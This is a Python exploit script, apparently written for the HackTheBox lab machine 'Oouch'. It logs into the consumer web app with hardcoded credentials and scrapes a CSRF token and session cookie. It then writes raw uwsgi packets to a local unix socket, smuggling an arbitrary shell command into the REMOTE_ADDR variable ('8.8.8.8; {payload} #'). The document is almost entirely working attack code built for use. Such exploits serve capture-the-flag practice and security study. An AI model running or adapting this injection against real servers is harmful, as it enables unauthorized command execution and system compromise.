import re
import sys
import socket
import ctypes
import requests
from urllib.parse import urlsplit

# First we need to define some structures that are used by the uwsgi protocol.
# Credits to: https://github.com/andreif/uwsgi-tools
class UwsgiPacketHeader(ctypes.Structure):
    """
    struct uwsgi_packet_header {
        uint8_t modifier1;
        uint16_t datasize;
        uint8_t modifier2;
    }
    """
    _pack_ = 1
    _fields_ = [
        ("modifier1", ctypes.c_int8),
        ("datasize", ctypes.c_int16),
        ("modifier2", ctypes.c_int8),
    ]


class UwsgiVar(object):
    """
    struct uwsgi_var {
        uint16_t key_size;
        uint8_t key[key_size];
        uint16_t val_size;
        uint8_t val[val_size];
    }
    """

    def __new__(self, key_size, key, val_size, val):
        class UwsgiVar(ctypes.Structure):
            _pack_ = 1
            _fields_ = [
                ("key_size", ctypes.c_int16),
                ("key", ctypes.c_char * key_size),
                ("val_size", ctypes.c_int16),
                ("val", ctypes.c_char * val_size),
            ]

        return UwsgiVar(key_size, key, val_size, val)

    @classmethod
    def from_buffer(cls, buffer, offset=0):
        key_size = ctypes.c_int16.from_buffer(buffer, offset).value
        offset += ctypes.sizeof(ctypes.c_int16)
        key = (ctypes.c_char * key_size).from_buffer(buffer, offset).value
        offset += ctypes.sizeof(ctypes.c_char * key_size)
        val_size = ctypes.c_int16.from_buffer(buffer, offset).value
        offset += ctypes.sizeof(ctypes.c_int16)
        val = (ctypes.c_char * val_size).from_buffer(buffer, offset).value

        return cls(key_size, key, val_size, val)


# This function parses variables from python to uwsgi format. 
# Again credits go to: https://github.com/andreif/uwsgi-tools
def pack_uwsgi_vars(var):
    encoded_vars = [
        (k.encode('utf-8'), v.encode('utf-8'))
        for k, v in var.items()
    ]
    packed_vars = b''.join(
        bytes(UwsgiVar(len(k), k, len(v), v))
        for k, v in encoded_vars
    )
    packet_header = bytes(UwsgiPacketHeader(0, len(packed_vars), 0))
    return packet_header + packed_vars



def send_to_uwsgi(addr, var, body=''):
    '''
    Opens a connection to a uwsgi unix domain socket and sends a request to it. The response will be returned by the
    function.

    Parameters:
        addr                (String)                Address of the unix domain socket.
        var                 (dict)                  uwsgi variablaes.
        body                (String)                Optional body for POST requests.

    Returns:
        response            (String)                Response from the uwsgi socket.
    '''
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.connect(addr)

    if body is None:
        body = ''

    print(pack_uwsgi_vars(var) + body.encode('utf8'))
    sock.send(pack_uwsgi_vars(var) + body.encode('utf8'))

    response = []
    while 1:
        data = sock.recv(4096)
        if not data:
            break
        response.append(data)

    sock.close()

    return b''.join(response).decode('utf8')


def login_consumer(username, password):
    '''
    The following function performs a login into the consumer application. 

    Parameters:
        username                (String)                    Username.
        password                (String)                    Password.

    Returns:
        session_cookie          (String)                    Session cookie.
    '''
    print(f'[+] Starting login on consumer application')
    # First we issue an request to obtain a initial session and the csrf token
    r = requests.get("http://consumer.oouch.htb:5000")

    # Session is parsed from the headers
    print(r.text)
    session_tmp = r.headers["Set-Cookie"].split("=")[1]
    session_tmp = session_tmp.split(";")[0]
    print(f'[+] Temporary Session-ID: {session_tmp}')

    # Csrf token is captured by regex
    csrf_regex = re.compile('name="csrf_token" type="hidden" value="([^"]+)"')
    csrf_token = csrf_regex.search(r.text).group(1)
    print(f'[+] CSRF Token: {csrf_token}')

    # When we prepare the login data
    data = {
                "csrf_token" : csrf_token,
                "username" : username,
                "password" : password,
                "submit" : "Sign In",
           }

    # And set the temporary session cookie
    cookies = {
                "session": session_tmp,
              }

    # Finally we peform the login request. We need to avoid redirects since we want the ne cookie from the 302 response
    r = requests.post("http://consumer.oouch.htb:5000/login", data=data, cookies=cookies,  allow_redirects=False)

    # Parse the session from the headers
    session = r.headers["Set-Cookie"].split("=")[1]
    print(f'[+] Admin cookie obtained: {session}')

    # And return it back to the client
    return (session, csrf_token)


def exploit(csrf_token, session_id, payload):
    '''
    Final exploit function. Simply defines the neccessary uwsgi parameters and inserts our malicious payload.

    Parameters:
        csrf_token              (String)            Since the exploit uses the contact form, we need a valid CSRF Token.
        session_id              (String)            The contact form can only be used by authenticated users.
        payload                 (String)            This is the command that is executed.

    Returns:
        None
    '''
    body = f'csrf_token={csrf_token}&textfield=<script>&submit=Send'

    var = {
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'PATH_INFO': '/contact',
        'REQUEST_METHOD': 'POST',
        'REQUEST_URI': '/contact',
        # For some reason one needs to define the body twice. No idea why...
        'DOCUMENT_BODY': f'csrf_token={csrf_token}&textfield=<script>&submit=Send',
        'HTTP_HOST': 'consumer.oouch.htb:5000',
        'CONTENT_LENGTH': str(len(body)),
        'CONTENT_TYPE': "application/x-www-form-urlencoded"
    }

    var['HTTP_COOKIE'] = f'session={session_id}'
    var['SERVER_NAME'] = 'consumer.oouch.htb'
    var['SERVER_PORT'] = "5000"
    var['REMOTE_ADDR']= f'8.8.8.8; {payload} #'

    result = send_to_uwsgi(addr='/tmp/uwsgi.socket', var=var, body=body)
    print(result)


if len(sys.argv) != 2:
    print(f'[-] {sys.argv[0]} <CMD>')
    sys.exit(1)

(session, csrf_token) = login_consumer("Test", "password123!")
exploit(csrf_token, session, sys.argv[1])
